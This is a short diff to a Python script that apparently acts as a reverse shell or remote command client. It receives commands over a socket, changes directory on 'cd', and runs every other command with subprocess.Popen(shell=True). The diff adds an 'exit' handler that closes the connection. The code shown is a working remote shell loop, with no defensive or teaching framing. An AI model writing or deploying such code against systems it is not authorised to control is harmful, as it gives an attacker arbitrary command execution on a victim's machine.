@@ -1,6 +1,7 @@
 import socket
 import os
 import subprocess
+import sys
 
 #run this side in 
 
@@ -31,6 +32,10 @@ while True:
     if  command.startswith("cd "):
         os.chdir(str(command[3:]))  #Force change dir with built in OS function 
         s.send(os.getcwd().encode()) 
+
+    if 'exit' in command:
+        s.close()
+        sys.exit()
 
     else:
         CMD = subprocess.Popen(command, shell = True, stdout=subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
